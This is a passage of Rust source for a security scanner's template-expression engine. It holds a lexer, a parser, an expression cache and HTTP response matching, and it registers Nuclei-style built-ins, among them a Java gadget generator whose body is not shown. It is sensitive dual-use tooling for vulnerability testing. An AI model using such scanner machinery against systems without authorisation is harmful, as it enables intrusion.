use anyhow::{anyhow, Result};
use regex::Regex;
use std::collections::HashMap;
use std::fmt;
use reqwest::{StatusCode, header::HeaderMap};

use sha2::{Sha256, Digest};
use base64::{Engine as _, engine::general_purpose};
use std::time::{SystemTime, UNIX_EPOCH};
use url::form_urlencoded;
use flate2::{Compression, write::GzEncoder, write::ZlibEncoder, read::GzDecoder, read::ZlibDecoder};
use std::io::{Write, Read};
use rand::Rng;
use chrono::{DateTime, Utc};
use serde_json::{Value as JsonValue, to_string_pretty, to_string as to_string_compact};
use html_escape::{encode_text, decode_html_entities};
use hmac::{Hmac, Mac};
use sha1::Sha1;

use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead, KeyInit}};
use trust_dns_resolver::{Resolver, config::{ResolverConfig, ResolverOpts}};
use trust_dns_resolver::proto::rr::RecordType;
use once_cell::sync::Lazy;
use dashmap::DashMap;
use std::sync::Arc;
use byteorder::{BigEndian, WriteBytesExt};
use miniz_oxide::deflate::compress_to_vec as deflate_compress;
use miniz_oxide::inflate::decompress_to_vec as inflate_decompress;
use std::net::{TcpStream, SocketAddr};
use std::time::Duration;
use futures::TryFutureExt;

/// 全局表达式缓存
static EXPRESSION_CACHE: Lazy<DashMap<String, Arc<CompiledExpression>>> = Lazy::new(|| DashMap::new());

/// 创建DNS解析器实例
fn create_dns_resolver() -> Result<Resolver> {
    Resolver::new(ResolverConfig::default(), ResolverOpts::default())
        .map_err(|e| anyhow!("创建DNS解析器失败: {}", e))
}

/// 预编译的表达式
#[derive(Debug, Clone)]
pub struct CompiledExpression {
    /// 原始表达式字符串
    pub expression: String,
    /// 编译后的AST
    pub ast: AstNode,
    /// 编译时间戳
    pub compiled_at: std::time::SystemTime,
}

impl CompiledExpression {
    /// 编译表达式
    pub fn compile(expression: &str) -> Result<Self> {
        let lexer = Lexer::new(expression);
        let mut parser = Parser::new(lexer)?;
        let ast = parser.parse()?;

        Ok(CompiledExpression {
            expression: expression.to_string(),
            ast,
            compiled_at: std::time::SystemTime::now(),
        })
    }

    /// 求值预编译的表达式
    pub fn evaluate(&self, evaluator: &DslEvaluator) -> Result<DslValue> {
        evaluator.evaluate(&self.ast)
    }
}

/// 表达式缓存管理器
pub struct ExpressionCache;

impl ExpressionCache {
    /// 获取或编译表达式
    pub fn get_or_compile(expression: &str) -> Result<Arc<CompiledExpression>> {
        if let Some(compiled) = EXPRESSION_CACHE.get(expression) {
            return Ok(compiled.clone());
        }

        let compiled = Arc::new(CompiledExpression::compile(expression)?);
        EXPRESSION_CACHE.insert(expression.to_string(), compiled.clone());
        Ok(compiled)
    }

    /// 清理过期的缓存项
    pub fn cleanup_expired(max_age: std::time::Duration) {
        let now = std::time::SystemTime::now();
        EXPRESSION_CACHE.retain(|_, compiled| {
            now.duration_since(compiled.compiled_at).unwrap_or_default() < max_age
        });
    }

    /// 获取缓存统计信息
    pub fn stats() -> (usize, usize) {
        (EXPRESSION_CACHE.len(), EXPRESSION_CACHE.capacity())
    }
}

/// 工作流执行上下文
#[derive(Debug, Clone)]
pub struct WorkflowContext {
    /// 全局变量存储
    global_vars: HashMap<String, DslValue>,
    /// 模板间共享的提取器变量
    shared_extractors: HashMap<String, DslValue>,
    /// Cookie存储
    cookies: HashMap<String, String>,
    /// 会话状态
    session_data: HashMap<String, DslValue>,
}

impl WorkflowContext {
    /// 创建新的工作流上下文
    pub fn new() -> Self {
        WorkflowContext {
            global_vars: HashMap::new(),
            shared_extractors: HashMap::new(),
            cookies: HashMap::new(),
            session_data: HashMap::new(),
        }
    }

    /// 设置全局变量
    pub fn set_global_var(&mut self, name: String, value: DslValue) {
        self.global_vars.insert(name, value);
    }

    /// 获取全局变量
    pub fn get_global_var(&self, name: &str) -> Option<&DslValue> {
        self.global_vars.get(name)
    }

    /// 设置提取器变量
    pub fn set_extractor_var(&mut self, name: String, value: DslValue) {
        self.shared_extractors.insert(name, value);
    }

    /// 获取提取器变量
    pub fn get_extractor_var(&self, name: &str) -> Option<&DslValue> {
        self.shared_extractors.get(name)
    }

    /// 设置Cookie
    pub fn set_cookie(&mut self, name: String, value: String) {
        self.cookies.insert(name, value);
    }

    /// 获取所有Cookie
    pub fn get_cookies(&self) -> &HashMap<String, String> {
        &self.cookies
    }

    /// 合并另一个工作流上下文
    pub fn merge(&mut self, other: &WorkflowContext) {
        self.global_vars.extend(other.global_vars.clone());
        self.shared_extractors.extend(other.shared_extractors.clone());
        self.cookies.extend(other.cookies.clone());
        self.session_data.extend(other.session_data.clone());
    }

    /// 导出为DSL变量映射
    pub fn to_dsl_variables(&self) -> HashMap<String, DslValue> {
        let mut vars = HashMap::new();
        vars.extend(self.global_vars.clone());
        vars.extend(self.shared_extractors.clone());
        vars.extend(self.session_data.clone());
        vars
    }
}

/// DSL值类型枚举
#[derive(Debug, Clone, PartialEq)]
pub enum DslValue {
    /// 字符串值
    String(String),
    /// 整数值
    Integer(i64),
    /// 布尔值
    Boolean(bool),
    /// 浮点数值
    Float(f64),
}

impl fmt::Display for DslValue {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DslValue::String(s) => write!(f, "{}", s),
            DslValue::Integer(i) => write!(f, "{}", i),
            DslValue::Boolean(b) => write!(f, "{}", b),
            DslValue::Float(fl) => write!(f, "{}", fl),
        }
    }
}

impl DslValue {
    /// 判断值是否为真值
    pub fn is_truthy(&self) -> bool {
        self.to_bool()
    }

    /// 转换为布尔值
    pub fn to_bool(&self) -> bool {
        match self {
            DslValue::Boolean(b) => *b,
            DslValue::String(s) => !s.is_empty(),
            DslValue::Integer(i) => *i != 0,
            DslValue::Float(f) => *f != 0.0,
        }
    }

    /// 转换为字符串
    pub fn to_string(&self) -> String {
        match self {
            DslValue::String(s) => s.clone(),
            DslValue::Integer(i) => i.to_string(),
            DslValue::Boolean(b) => b.to_string(),
            DslValue::Float(f) => f.to_string(),
        }
    }

    /// 转换为整数
    pub fn to_integer(&self) -> Result<i64> {
        match self {
            DslValue::Integer(i) => Ok(*i),
            DslValue::String(s) => s.parse::<i64>().map_err(|e| anyhow!("无法将字符串转换为整数: {}", e)),
            DslValue::Boolean(b) => Ok(if *b { 1 } else { 0 }),
            DslValue::Float(f) => Ok(*f as i64),
        }
    }
}

/// Token类型枚举
#[derive(Debug, Clone, PartialEq)]
pub enum Token {
    /// 标识符 (变量名或函数名)
    Identifier(String),
    /// 字符串字面量
    StringLiteral(String),
    /// 整数字面量
    IntegerLiteral(i64),
    /// 浮点数字面量
    FloatLiteral(f64),
    /// 布尔字面量
    BooleanLiteral(bool),
    /// 左括号
    LeftParen,
    /// 右括号
    RightParen,
    /// 左方括号
    LeftBracket,
    /// 右方括号
    RightBracket,
    /// 逗号
    Comma,
    /// 点号
    Dot,
    /// 逻辑与
    And,
    /// 逻辑或
    Or,
    /// 逻辑非
    Not,
    /// 等于
    Equal,
    /// 不等于
    NotEqual,
    /// 小于
    LessThan,
    /// 小于等于
    LessEqual,
    /// 大于
    GreaterThan,
    /// 大于等于
    GreaterEqual,
    /// 加号
    Plus,
    /// 减号
    Minus,
    /// 乘号
    Multiply,
    /// 除号
    Divide,
    /// 文件结束
    Eof,
}

/// 词法分析器
pub struct Lexer {
    input: Vec<char>,
    position: usize,
    current_char: Option<char>,
}

impl Lexer {
    /// 创建新的词法分析器
    pub fn new(input: &str) -> Self {
        let chars: Vec<char> = input.chars().collect();
        let current_char = chars.get(0).copied();
        
        Lexer {
            input: chars,
            position: 0,
            current_char,
        }
    }

    /// 前进到下一个字符
    fn advance(&mut self) {
        self.position += 1;
        self.current_char = self.input.get(self.position).copied();
    }

    /// 跳过空白字符
    fn skip_whitespace(&mut self) {
        while let Some(ch) = self.current_char {
            if ch.is_whitespace() {
                self.advance();
            } else {
                break;
            }
        }
    }

    /// 读取字符串字面量
    fn read_string(&mut self) -> Result<String> {
        let mut result = String::new();
        self.advance(); // 跳过开始的引号
        
        while let Some(ch) = self.current_char {
            if ch == '"' {
                self.advance(); // 跳过结束的引号
                return Ok(result);
            } else if ch == '\\' {
                self.advance();
                match self.current_char {
                    Some('n') => result.push('\n'),
                    Some('t') => result.push('\t'),
                    Some('r') => result.push('\r'),
                    Some('\\') => result.push('\\'),
                    Some('"') => result.push('"'),
                    Some(c) => result.push(c),
                    None => return Err(anyhow!("字符串字面量中的转义序列不完整")),
                }
                self.advance();
            } else {
                result.push(ch);
                self.advance();
            }
        }
        
        Err(anyhow!("未终止的字符串字面量"))
    }

    /// 读取单引号字符串字面量
    fn read_single_quoted_string(&mut self) -> Result<String> {
        let mut result = String::new();
        self.advance(); // 跳过开始的引号

        while let Some(ch) = self.current_char {
            if ch == '\'' {
                self.advance(); // 跳过结束的引号
                return Ok(result);
            } else if ch == '\\' {
                self.advance();
                match self.current_char {
                    Some('n') => result.push('\n'),
                    Some('t') => result.push('\t'),
                    Some('r') => result.push('\r'),
                    Some('\\') => result.push('\\'),
                    Some('\'') => result.push('\''),
                    Some(c) => result.push(c),
                    None => return Err(anyhow!("字符串字面量中的转义序列不完整")),
                }
                self.advance();
            } else {
                result.push(ch);
                self.advance();
            }
        }

        Err(anyhow!("未终止的字符串字面量"))
    }

    /// 读取数字
    fn read_number(&mut self) -> Token {
        let mut result = String::new();
        let mut is_float = false;
        
        while let Some(ch) = self.current_char {
            if ch.is_ascii_digit() {
                result.push(ch);
                self.advance();
            } else if ch == '.' && !is_float {
                is_float = true;
                result.push(ch);
                self.advance();
            } else {
                break;
            }
        }
        
        if is_float {
            Token::FloatLiteral(result.parse().unwrap_or(0.0))
        } else {
            Token::IntegerLiteral(result.parse().unwrap_or(0))
        }
    }

    /// 读取标识符或关键字
    fn read_identifier(&mut self) -> Token {
        let mut result = String::new();
        
        while let Some(ch) = self.current_char {
            if ch.is_alphanumeric() || ch == '_' {
                result.push(ch);
                self.advance();
            } else {
                break;
            }
        }
        
        // 检查是否为布尔字面量
        match result.as_str() {
            "true" => Token::BooleanLiteral(true),
            "false" => Token::BooleanLiteral(false),
            _ => Token::Identifier(result),
        }
    }

    /// 获取下一个token
    pub fn next_token(&mut self) -> Result<Token> {
        loop {
            match self.current_char {
                None => return Ok(Token::Eof),
                Some(ch) if ch.is_whitespace() => {
                    self.skip_whitespace();
                    continue;
                }
                Some('"') => {
                    let string_val = self.read_string()?;
                    return Ok(Token::StringLiteral(string_val));
                }
                Some('\'') => {
                    let string_val = self.read_single_quoted_string()?;
                    return Ok(Token::StringLiteral(string_val));
                }
                Some(ch) if ch.is_ascii_digit() => {
                    return Ok(self.read_number());
                }
                Some(ch) if ch.is_alphabetic() || ch == '_' => {
                    return Ok(self.read_identifier());
                }
                Some('(') => {
                    self.advance();
                    return Ok(Token::LeftParen);
                }
                Some(')') => {
                    self.advance();
                    return Ok(Token::RightParen);
                }
                Some(',') => {
                    self.advance();
                    return Ok(Token::Comma);
                }
                Some('.') => {
                    self.advance();
                    return Ok(Token::Dot);
                }
                Some('[') => {
                    self.advance();
                    return Ok(Token::LeftBracket);
                }
                Some(']') => {
                    self.advance();
                    return Ok(Token::RightBracket);
                }
                Some('&') => {
                    self.advance();
                    if self.current_char == Some('&') {
                        self.advance();
                        return Ok(Token::And);
                    }
                    return Err(anyhow!("意外的字符: &"));
                }
                Some('|') => {
                    self.advance();
                    if self.current_char == Some('|') {
                        self.advance();
                        return Ok(Token::Or);
                    }
                    return Err(anyhow!("意外的字符: |"));
                }
                Some('!') => {
                    self.advance();
                    if self.current_char == Some('=') {
                        self.advance();
                        return Ok(Token::NotEqual);
                    }
                    return Ok(Token::Not);
                }
                Some('=') => {
                    self.advance();
                    if self.current_char == Some('=') {
                        self.advance();
                        return Ok(Token::Equal);
                    }
                    return Err(anyhow!("意外的字符: ="));
                }
                Some('<') => {
                    self.advance();
                    if self.current_char == Some('=') {
                        self.advance();
                        return Ok(Token::LessEqual);
                    }
                    return Ok(Token::LessThan);
                }
                Some('>') => {
                    self.advance();
                    if self.current_char == Some('=') {
                        self.advance();
                        return Ok(Token::GreaterEqual);
                    }
                    return Ok(Token::GreaterThan);
                }
                Some('+') => {
                    self.advance();
                    return Ok(Token::Plus);
                }
                Some('-') => {
                    self.advance();
                    return Ok(Token::Minus);
                }
                Some('*') => {
                    self.advance();
                    return Ok(Token::Multiply);
                }
                Some('/') => {
                    self.advance();
                    return Ok(Token::Divide);
                }
                Some(ch) => {
                    return Err(anyhow!("意外的字符: {}", ch));
                }
            }
        }
    }
}

/// 抽象语法树节点
#[derive(Debug, Clone)]
pub enum AstNode {
    /// 字面量值
    Literal(DslValue),
    /// 变量引用
    Variable(String),
    /// 属性访问 (如 response.headers)
    PropertyAccess {
        object: Box<AstNode>,
        property: String,
    },
    /// 数组索引访问 (如 headers['server'])
    IndexAccess {
        object: Box<AstNode>,
        index: Box<AstNode>,
    },
    /// 函数调用
    FunctionCall {
        name: String,
        args: Vec<AstNode>,
    },
    /// 二元操作
    BinaryOp {
        left: Box<AstNode>,
        operator: BinaryOperator,
        right: Box<AstNode>,
    },
    /// 一元操作
    UnaryOp {
        operator: UnaryOperator,
        operand: Box<AstNode>,
    },
}

/// 二元操作符
#[derive(Debug, Clone)]
pub enum BinaryOperator {
    /// 逻辑与
    And,
    /// 逻辑或
    Or,
    /// 等于
    Equal,
    /// 不等于
    NotEqual,
    /// 小于
    LessThan,
    /// 小于等于
    LessEqual,
    /// 大于
    GreaterThan,
    /// 大于等于
    GreaterEqual,
    /// 加法
    Add,
    /// 减法
    Subtract,
    /// 乘法
    Multiply,
    /// 除法
    Divide,
}

/// 一元操作符
#[derive(Debug, Clone)]
pub enum UnaryOperator {
    /// 逻辑非
    Not,
    /// 负号
    Minus,
}

/// 语法分析器
pub struct Parser {
    lexer: Lexer,
    current_token: Token,
}

impl Parser {
    /// 创建新的语法分析器
    pub fn new(mut lexer: Lexer) -> Result<Self> {
        let current_token = lexer.next_token()?;
        Ok(Parser {
            lexer,
            current_token,
        })
    }

    /// 前进到下一个token
    fn advance(&mut self) -> Result<()> {
        self.current_token = self.lexer.next_token()?;
        Ok(())
    }

    /// 检查当前token是否匹配期望的类型
    fn expect(&mut self, expected: Token) -> Result<()> {
        if std::mem::discriminant(&self.current_token) == std::mem::discriminant(&expected) {
            self.advance()
        } else {
            Err(anyhow!("期望 {:?}, 但得到 {:?}", expected, self.current_token))
        }
    }

    /// 解析表达式
    pub fn parse(&mut self) -> Result<AstNode> {
        self.parse_or_expression()
    }

    /// 解析逻辑或表达式
    fn parse_or_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_and_expression()?;

        while self.current_token == Token::Or {
            self.advance()?;
            let right = self.parse_and_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator: BinaryOperator::Or,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析逻辑与表达式
    fn parse_and_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_equality_expression()?;

        while self.current_token == Token::And {
            self.advance()?;
            let right = self.parse_equality_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator: BinaryOperator::And,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析相等性表达式
    fn parse_equality_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_relational_expression()?;

        loop {
            let operator = match self.current_token {
                Token::Equal => BinaryOperator::Equal,
                Token::NotEqual => BinaryOperator::NotEqual,
                _ => break,
            };

            self.advance()?;
            let right = self.parse_relational_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析关系表达式
    fn parse_relational_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_additive_expression()?;

        loop {
            let operator = match self.current_token {
                Token::LessThan => BinaryOperator::LessThan,
                Token::LessEqual => BinaryOperator::LessEqual,
                Token::GreaterThan => BinaryOperator::GreaterThan,
                Token::GreaterEqual => BinaryOperator::GreaterEqual,
                _ => break,
            };

            self.advance()?;
            let right = self.parse_additive_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析加法表达式
    fn parse_additive_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_multiplicative_expression()?;

        loop {
            let operator = match self.current_token {
                Token::Plus => BinaryOperator::Add,
                Token::Minus => BinaryOperator::Subtract,
                _ => break,
            };

            self.advance()?;
            let right = self.parse_multiplicative_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析乘法表达式
    fn parse_multiplicative_expression(&mut self) -> Result<AstNode> {
        let mut left = self.parse_unary_expression()?;

        loop {
            let operator = match self.current_token {
                Token::Multiply => BinaryOperator::Multiply,
                Token::Divide => BinaryOperator::Divide,
                _ => break,
            };

            self.advance()?;
            let right = self.parse_unary_expression()?;
            left = AstNode::BinaryOp {
                left: Box::new(left),
                operator,
                right: Box::new(right),
            };
        }

        Ok(left)
    }

    /// 解析一元表达式
    fn parse_unary_expression(&mut self) -> Result<AstNode> {
        match self.current_token {
            Token::Not => {
                self.advance()?;
                let operand = self.parse_unary_expression()?;
                Ok(AstNode::UnaryOp {
                    operator: UnaryOperator::Not,
                    operand: Box::new(operand),
                })
            }
            Token::Minus => {
                self.advance()?;
                let operand = self.parse_unary_expression()?;
                Ok(AstNode::UnaryOp {
                    operator: UnaryOperator::Minus,
                    operand: Box::new(operand),
                })
            }
            _ => self.parse_primary_expression(),
        }
    }

    /// 解析基本表达式
    fn parse_primary_expression(&mut self) -> Result<AstNode> {
        let mut expr = self.parse_atom()?;

        // 处理属性访问和数组索引的链式调用
        loop {
            match self.current_token {
                Token::Dot => {
                    self.advance()?; // 跳过点号
                    if let Token::Identifier(property) = &self.current_token {
                        let property = property.clone();
                        self.advance()?;
                        expr = AstNode::PropertyAccess {
                            object: Box::new(expr),
                            property,
                        };
                    } else {
                        return Err(anyhow!("期望属性名，但得到: {:?}", self.current_token));
                    }
                }
                Token::LeftBracket => {
                    self.advance()?; // 跳过左方括号
                    let index = self.parse_or_expression()?;
                    self.expect(Token::RightBracket)?;
                    expr = AstNode::IndexAccess {
                        object: Box::new(expr),
                        index: Box::new(index),
                    };
                }
                _ => break,
            }
        }

        Ok(expr)
    }

    /// 解析原子表达式
    fn parse_atom(&mut self) -> Result<AstNode> {
        match &self.current_token {
            Token::StringLiteral(s) => {
                let value = s.clone();
                self.advance()?;
                Ok(AstNode::Literal(DslValue::String(value)))
            }
            Token::IntegerLiteral(i) => {
                let value = *i;
                self.advance()?;
                Ok(AstNode::Literal(DslValue::Integer(value)))
            }
            Token::FloatLiteral(f) => {
                let value = *f;
                self.advance()?;
                Ok(AstNode::Literal(DslValue::Float(value)))
            }
            Token::BooleanLiteral(b) => {
                let value = *b;
                self.advance()?;
                Ok(AstNode::Literal(DslValue::Boolean(value)))
            }
            Token::Identifier(name) => {
                let name = name.clone();
                self.advance()?;

                // 检查是否为函数调用
                if self.current_token == Token::LeftParen {
                    self.advance()?; // 跳过左括号

                    let mut args = Vec::new();

                    // 解析参数列表
                    if self.current_token != Token::RightParen {
                        loop {
                            args.push(self.parse_or_expression()?);

                            if self.current_token == Token::Comma {
                                self.advance()?;
                            } else {
                                break;
                            }
                        }
                    }

                    self.expect(Token::RightParen)?;

                    Ok(AstNode::FunctionCall { name, args })
                } else {
                    // 变量引用
                    Ok(AstNode::Variable(name))
                }
            }
            Token::LeftParen => {
                self.advance()?; // 跳过左括号
                let expr = self.parse_or_expression()?;
                self.expect(Token::RightParen)?;
                Ok(expr)
            }
            _ => Err(anyhow!("意外的token: {:?}", self.current_token)),
        }
    }
}

/// HTTP响应上下文
#[derive(Debug, Clone)]
pub struct ResponseContext {
    pub status_code: i64,
    pub body: String,
    pub headers: String,
    pub content_length: i64,
    pub response_time: i64,
}

/// HTTP请求上下文
#[derive(Debug, Clone)]
pub struct RequestContext {
    pub method: String,
    pub url: String,
    pub path: String,
    pub headers: String,
}

/// DSL执行上下文
#[derive(Debug, Clone)]
pub struct DslContext {
    /// 基本变量
    variables: HashMap<String, DslValue>,
    /// 响应上下文
    response: Option<ResponseContext>,
    /// 请求上下文
    request: Option<RequestContext>,
    /// 提取器变量
    extracted_vars: HashMap<String, DslValue>,
    /// 模板变量
    template_vars: HashMap<String, String>,
    /// 工作流上下文
    workflow_context: Option<Arc<WorkflowContext>>,
    /// 内置函数
    functions: HashMap<String, fn(&[DslValue]) -> Result<DslValue>>,
}

impl DslContext {
    /// 创建新的DSL上下文
    pub fn new() -> Self {
        let mut context = DslContext {
            variables: HashMap::new(),
            response: None,
            request: None,
            extracted_vars: HashMap::new(),
            template_vars: HashMap::new(),
            workflow_context: None,
            functions: HashMap::new(),
        };

        // 注册内置函数
        context.register_builtin_functions();
        context
    }

    /// 设置变量值
    pub fn set_variable(&mut self, name: String, value: DslValue) {
        self.variables.insert(name, value);
    }

    /// 设置响应上下文
    pub fn set_response_context(&mut self, response: ResponseContext) {
        self.response = Some(response);
    }

    /// 设置请求上下文
    pub fn set_request_context(&mut self, request: RequestContext) {
        self.request = Some(request);
    }

    /// 设置提取器变量
    pub fn set_extracted_variable(&mut self, name: String, value: DslValue) {
        self.extracted_vars.insert(name, value);
    }

    /// 设置模板变量
    pub fn set_template_variable(&mut self, name: String, value: String) {
        self.template_vars.insert(name, value);
    }

    /// 设置工作流上下文
    pub fn set_workflow_context(&mut self, workflow_context: Arc<WorkflowContext>) {
        self.workflow_context = Some(workflow_context);
    }

    /// 获取变量值（支持复杂路径）
    pub fn get_variable(&self, name: &str) -> Option<DslValue> {
        // 特殊处理 "response" 变量，返回一个特殊标识
        if name == "response" {
            return Some(DslValue::String("__response_object__".to_string()));
        }

        // 检查是否为复合变量名（如 response.status_code）
        if name.contains('.') {
            let parts: Vec<&str> = name.split('.').collect();
            if parts.len() == 2 {
                match parts[0] {
                    "response" => {
                        if let Some(ref resp) = self.response {
                            match parts[1] {
                                "status_code" => return Some(DslValue::Integer(resp.status_code)),
                                "body" => return Some(DslValue::String(resp.body.clone())),
                                "headers" => return Some(DslValue::String(resp.headers.clone())),
                                "content_length" => return Some(DslValue::Integer(resp.content_length)),
                                "response_time" => return Some(DslValue::Integer(resp.response_time)),
                                _ => {}
                            }
                        }
                    }
                    "request" => {
                        if let Some(ref req) = self.request {
                            match parts[1] {
                                "method" => return Some(DslValue::String(req.method.clone())),
                                "url" => return Some(DslValue::String(req.url.clone())),
                                "path" => return Some(DslValue::String(req.path.clone())),
                                "headers" => return Some(DslValue::String(req.headers.clone())),
                                _ => {}
                            }
                        }
                    }
                    _ => {}
                }
            }
        }

        // 检查提取器变量
        if let Some(value) = self.extracted_vars.get(name) {
            return Some(value.clone());
        }

        // 检查基本变量
        if let Some(value) = self.variables.get(name) {
            return Some(value.clone());
        }

        // 检查模板变量
        if let Some(value) = self.template_vars.get(name) {
            return Some(DslValue::String(value.clone()));
        }

        // 检查工作流变量
        if let Some(ref workflow) = self.workflow_context {
            if let Some(value) = workflow.get_global_var(name) {
                return Some(value.clone());
            }
            if let Some(value) = workflow.get_extractor_var(name) {
                return Some(value.clone());
            }
        }

        None
    }

    /// 注册内置函数
    fn register_builtin_functions(&mut self) {
        // 字符串函数
        self.functions.insert("len".to_string(), builtin_len);
        self.functions.insert("contains".to_string(), builtin_contains);
        self.functions.insert("contains_all".to_string(), builtin_contains_all);
        self.functions.insert("contains_any".to_string(), builtin_contains_any);
        self.functions.insert("starts_with".to_string(), builtin_starts_with);
        self.functions.insert("ends_with".to_string(), builtin_ends_with);
        self.functions.insert("line_starts_with".to_string(), builtin_line_starts_with);
        self.functions.insert("line_ends_with".to_string(), builtin_line_ends_with);
        self.functions.insert("to_upper".to_string(), builtin_to_upper);
        self.functions.insert("to_lower".to_string(), builtin_to_lower);
        // 添加nuclei兼容的别名
        self.functions.insert("toupper".to_string(), builtin_toupper);
        self.functions.insert("tolower".to_string(), builtin_tolower);
        self.functions.insert("toupper".to_string(), builtin_to_upper); // 别名
        self.functions.insert("tolower".to_string(), builtin_to_lower); // 别名
        self.functions.insert("trim".to_string(), builtin_trim);
        self.functions.insert("trim_left".to_string(), builtin_trim_left);
        self.functions.insert("trim_right".to_string(), builtin_trim_right);
        self.functions.insert("trim_space".to_string(), builtin_trim_space);
        self.functions.insert("trim_prefix".to_string(), builtin_trim_prefix);
        self.functions.insert("trim_suffix".to_string(), builtin_trim_suffix);
        self.functions.insert("reverse".to_string(), builtin_reverse);
        self.functions.insert("repeat".to_string(), builtin_repeat);
        self.functions.insert("replace".to_string(), builtin_replace);
        self.functions.insert("replace_regex".to_string(), builtin_replace_regex);
        self.functions.insert("remove_bad_chars".to_string(), builtin_remove_bad_chars);
        self.functions.insert("concat".to_string(), builtin_concat);
        self.functions.insert("join".to_string(), builtin_join);

        // 正则表达式函数
        self.functions.insert("regex".to_string(), builtin_regex);

        // 编码/解码函数
        self.functions.insert("base64".to_string(), builtin_base64);
        self.functions.insert("base64_decode".to_string(), builtin_base64_decode);
        self.functions.insert("base64_py".to_string(), builtin_base64_py);
        self.functions.insert("hex_encode".to_string(), builtin_hex_encode);
        self.functions.insert("hex_decode".to_string(), builtin_hex_decode);
        self.functions.insert("url_encode".to_string(), builtin_url_encode);
        self.functions.insert("url_decode".to_string(), builtin_url_decode);
        self.functions.insert("html_escape".to_string(), builtin_html_escape);
        self.functions.insert("html_unescape".to_string(), builtin_html_unescape);

        // 哈希函数
        self.functions.insert("md5".to_string(), builtin_md5);
        self.functions.insert("sha1".to_string(), builtin_sha1);
        self.functions.insert("sha256".to_string(), builtin_sha256);
        self.functions.insert("mmh3".to_string(), builtin_mmh3);
        self.functions.insert("hmac".to_string(), builtin_hmac);

        // 压缩函数
        self.functions.insert("gzip".to_string(), builtin_gzip);
        self.functions.insert("gzip_decode".to_string(), builtin_gzip_decode);
        self.functions.insert("zlib".to_string(), builtin_zlib);
        self.functions.insert("zlib_decode".to_string(), builtin_zlib_decode);

        // 数字转换函数
        self.functions.insert("bin_to_dec".to_string(), builtin_bin_to_dec);
        self.functions.insert("dec_to_hex".to_string(), builtin_dec_to_hex);
        self.functions.insert("hex_to_dec".to_string(), builtin_hex_to_dec);
        self.functions.insert("oct_to_dec".to_string(), builtin_oct_to_dec);

        // 压缩函数（新增）
        self.functions.insert("deflate".to_string(), builtin_deflate);
        self.functions.insert("inflate".to_string(), builtin_inflate);

        // 随机函数
        self.functions.insert("rand_base".to_string(), builtin_rand_base);
        self.functions.insert("rand_char".to_string(), builtin_rand_char);
        self.functions.insert("rand_int".to_string(), builtin_rand_int);
        self.functions.insert("rand_text_alpha".to_string(), builtin_rand_text_alpha);
        self.functions.insert("rand_text_alphanumeric".to_string(), builtin_rand_text_alphanumeric);
        self.functions.insert("rand_text_numeric".to_string(), builtin_rand_text_numeric);
        self.functions.insert("rand_ip".to_string(), builtin_rand_ip);

        // 时间函数
        self.functions.insert("unix_time".to_string(), builtin_unix_time);
        self.functions.insert("date_time".to_string(), builtin_date_time);
        self.functions.insert("to_unix_time".to_string(), builtin_to_unix_time);

        // JSON函数
        self.functions.insert("json_minify".to_string(), builtin_json_minify);
        self.functions.insert("json_prettify".to_string(), builtin_json_prettify);

        // 版本比较函数
        self.functions.insert("compare_versions".to_string(), builtin_compare_versions);

        // 调试函数
        self.functions.insert("print_debug".to_string(), builtin_print_debug);

        // 高级函数
        self.functions.insert("wait_for".to_string(), builtin_wait_for);
        self.functions.insert("generate_jwt".to_string(), builtin_generate_jwt);
        self.functions.insert("resolve".to_string(), builtin_resolve);
        self.functions.insert("ip_format".to_string(), builtin_ip_format);
        self.functions.insert("crc32".to_string(), builtin_crc32);
        self.functions.insert("aes_gcm".to_string(), builtin_aes_gcm);
        self.functions.insert("generate_java_gadget".to_string(), builtin_generate_java_gadget);

        // 新增缺失的高级函数
        self.functions.insert("jarm".to_string(), builtin_jarm);
        self.functions.insert("public_ip".to_string(), builtin_public_ip);
        self.functions.insert("unpack".to_string(), builtin_unpack);
        self.functions.insert("padding".to_string(), builtin_padding);
        self.functions.insert("index".to_string(), builtin_index);
        self.functions.insert("xor".to_string(), builtin_xor);
    }

    /// 调用函数
    pub fn call_function(&self, name: &str, args: &[DslValue]) -> Result<DslValue> {
        if let Some(func) = self.functions.get(name) {
            func(args)
        } else {
            Err(anyhow!("未知函数: {}", name))
        }
    }
}

/// DSL求值器
#[derive(Clone)]
pub struct DslEvaluator {
    context: DslContext,
}

impl DslEvaluator {
    /// 创建新的求值器
    pub fn new() -> Self {
        DslEvaluator {
            context: DslContext::new(),
        }
    }

    /// 从HTTP响应创建求值器
    pub fn from_http_response(
        status: &StatusCode,
        headers: &HeaderMap,
        body: &str,
        url: &str,
    ) -> Self {
        Self::from_http_response_with_duration(status, headers, body, url, 0.0)
    }

    /// 从HTTP响应创建求值器（带响应时间）
    pub fn from_http_response_with_duration(
        status: &StatusCode,
        headers: &HeaderMap,
        body: &str,
        url: &str,
        duration_ms: f64,
    ) -> Self {
        let mut evaluator = Self::new();

        // 创建响应上下文
        let headers_string = headers.iter()
            .map(|(k, v)| format!("{}: {}", k.as_str(), v.to_str().unwrap_or("")))
            .collect::<Vec<_>>()
            .join("\n");

        let response_context = ResponseContext {
            status_code: status.as_u16() as i64,
            body: body.to_string(),
            headers: headers_string.clone(),
            content_length: body.len() as i64,
            response_time: duration_ms as i64,
        };

        // 创建请求上下文
        let request_context = RequestContext {
            method: "GET".to_string(), // 需要从外部传入
            url: url.to_string(),
            path: url.split('?').next().unwrap_or(url).to_string(),
            headers: String::new(), // 需要从外部传入
        };

        evaluator.context.set_response_context(response_context);
        evaluator.context.set_request_context(request_context);

        // 设置向后兼容的基本变量
